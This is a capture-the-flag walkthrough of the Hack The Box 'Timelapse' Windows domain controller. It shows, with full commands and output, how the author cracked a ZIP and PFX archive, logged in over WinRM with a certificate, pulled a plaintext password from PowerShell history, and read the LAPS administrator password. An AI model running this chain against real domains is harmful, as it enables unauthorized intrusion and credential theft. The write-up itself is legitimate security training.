---
categories:
- Hackthebox
image:
  path: timelapse.png
layout: post
media_subpath: /assets/images/timelapse
tags:
- hackthebox
- writeup
- windows
- active-directory
- winrm
- pfx
- laps
- ldap
- evil-winrm
- powershell-history
- easy
title: HTB - Timelapse Walkthrough
---

## Introduction
Timelapse is a easy-difficulty Windows domain controller that demonstrates several Active Directory attack techniques including SMB enumeration with guest access, ZIP archive cracking, PFX certificate extraction, PowerShell history analysis for credential discovery, LAPS group abuse for local administrator password retrieval, and finally domain compromise.

## Reconnaissance
### Port Scanning

Initial `nmap` scan reveals a Windows domain controller with standard AD services:

```
 nmap -sC -sV -oA nmap/timelapse 10.10.11.152          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 11:15 UTC
Nmap scan report for 10.10.11.152
Host is up (0.23s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-08-04 19:16:50Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2025-08-04T19:18:15+00:00; +8h00m30s from scanner time.
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m29s, deviation: 0s, median: 8h00m29s
| smb2-time: 
|   date: 2025-08-04T19:17:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.63 seconds
```

**Key Findings:**

- Domain: `timelapse.htb`
- Hostname: `dc01.timelapse.htb`
- WinRM over HTTPS (port 5986)
- No WinRM over HTTP (port 5985) - using SSL only

Add domain to hosts file:

```
echo '10.10.11.152  dc01.timelapse.htb timelapse.htb dc01' | sudo tee -a /etc/hosts
```

## SMB Enumeration

### Guest Access

Anonymous guest access is allowed:

```
nxc smb  10.10.11.152 -u 'guest' -p '' --shares
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\guest: 
SMB         10.10.11.152    445    DC01             [*] Enumerated shares
SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
SMB         10.10.11.152    445    DC01             -----           -----------     ------
SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.152    445    DC01             C$                              Default share
SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.152    445    DC01             Shares          READ            
SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share 
```

### Share Contents

Connecting to the `Shares` share:

```
smbclient -N //10.10.11.152/Shares       
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 15:39:15 2021
  ..                                  D        0  Mon Oct 25 15:39:15 2021
  Dev                                 D        0  Mon Oct 25 19:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 15:48:42 2021

                6367231 blocks of size 4096. 1348553 blocks available
```

Inside `Dev`, a password-protected ZIP file is discovered:

```
smb: \Dev> ls
  winrm_backup.zip                    A     2555  Mon Oct 25 19:40:06 2021
```

## ZIP Archive Cracking

### Download and Analyze

```
smb: \Dev> get winrm_backup.zip
```

The archive contains a PFX certificate file:

```
unzip smb/winrm_backup.zip 
Archive:  smb/winrm_backup.zip
[smb/winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```

### Cracking the ZIP Password

Using `zip2john` and `john`:

```
zip2john winrm_backup.zip > win.hash
john win.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Extract the PFX file:

```
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx  
```

## PFX Certificate Analysis

### Technical Concept: PFX (Personal Information Exchange)

A PFX file (also called PKCS#12) is a password-protected container that stores:

- Private key (for authentication)
- Public certificate (for identity verification)
- Certificate chain (optional)

### Cracking PFX Password

PFX files have their own encryption layer. Using `pfx2john`:

```
pfx2john legacyy_dev_auth.pfx > pxf.hash
john hashes/timelapse/pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:39 DONE (2025-08-04 15:15) 0.01005g/s 32483p/s 32483c/s 32483C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**Cracked PFX Password:** `thuglegacy`

### Extracting Certificate and Private Key

```
# Extract private key
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out client-key.pem -nodes
Enter Import Password: thuglegacy

# Extract certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out client-cert.pem
Enter Import Password: thuglegacy
```
## Initial Access as legacyy

### Technical Concept: Certificate-Based WinRM Authentication

WinRM over HTTPS (port 5986) supports certificate-based authentication. The client presents:

- **Certificate** (`client-cert.pem`): Proves identity
- **Private key** (`client-key.pem`): Proves ownership of the certificate

This bypasses password authentication entirely.

### Connecting via Evil-WinRM

```
evil-winrm -c  client-cert.pem -k client-key.pem -i 10.10.11.152 -S
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```
**User flag:** `C:\Users\legacyy\Desktop\user.txt`
## Lateral Movement - svc_deploy

### PowerShell Console History

**Technical Concept: PSReadLine History**

PowerShell's PSReadLine module saves command history to a file for session persistence. This file is located at:

```
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Why this matters:** Users often type sensitive information (passwords) directly in commands, which gets saved to this history file. Unlike bash history which is often cleared, PSReadLine history persists across sessions.

### Extracting Credentials from History

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

**Credentials Discovered:**

- Username: `svc_deploy`
- Password: `E3R$Q62^12p7PLlC%KWaxuaV`

### Verifying Credentials

```
nxc winrm timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'           
WINRM-SSL   10.10.11.152    5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM-SSL   10.10.11.152    5986   DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV (Pwn3d!)
```
### Access as svc_deploy

```
evil-winrm -i timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```
## Privilege Escalation - LAPS Abuse

### Understanding LAPS (Local Administrator Password Solution)

**What is LAPS?**

LAPS is a Microsoft tool that automatically manages local administrator passwords on domain-joined computers. Key characteristics:

1. **Random Generation:** Each machine gets a unique, complex password
2. **Regular Rotation:** Passwords change automatically at configured intervals
3. **AD Storage:** Passwords are stored in Active Directory as a confidential attribute
4. **ACL Protection:** Access to read passwords is controlled via AD permissions

**Where LAPS Stores Passwords:**

- Computer object attribute: `ms-MCS-AdmPwd`
- Only authorized users/groups have read access

### Why LAPS is Valuable for Attackers

If you compromise an account in the **LAPS_Readers** group, you can:

1. Query AD for all computer objects
2. Read the `ms-MCS-AdmPwd` attribute
3. Get the current local administrator password for any computer (including Domain Controllers!)

### Checking Group Membership

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103
<....SNIP...>
GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
<...SNIP...>
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
<...SNIP...>
```

**Critical:** `svc_deploy` is in the `LAPS_Readers` group!

### Extracting LAPS Passwords

Using `netexec` with the LAPS module:

```
nxc ldap timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps      
LDAP        10.10.11.152    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        10.10.11.152    389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer:DC01$ User:                Password:c2XB-ZmL9#&}kl-.whtK$)+{
```

### Technical Note: Why We Log in as Administrator, Not DC01$

**Question:** Why do we use the extracted LAPS password to log in as `Administrator` rather than as `DC01$`?

**Answer:** LAPS manages the **local administrator account** password, NOT the machine account password.

|Account Type|Purpose|Password Managed By|Can log in remotely?|
|---|---|---|---|
|`Administrator`|Local admin account for interactive/system use|LAPS (rotated automatically)|YES (via WinRM/RDP)|
|`DC01$`|Machine account for domain operations|AD domain (Kerberos)|NO (not a user account)|

**Key Differences:**

- `DC01$` is a **computer object** in AD, not a user - it authenticates as the machine itself
- `Administrator` is the **local user account** with administrative privileges
- LAPS rotates the local `Administrator` password and stores it in AD
- We use the LAPS password to authenticate as `Administrator` via WinRM

### Administrator Shell
```
 evil-winrm -i timelapse.htb -u Administrator -p 'c2XB-ZmL9#&}kl-.whtK$)+{' -S
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
**Root flag:** `C:\Users\TRX\Desktop\root.txt`
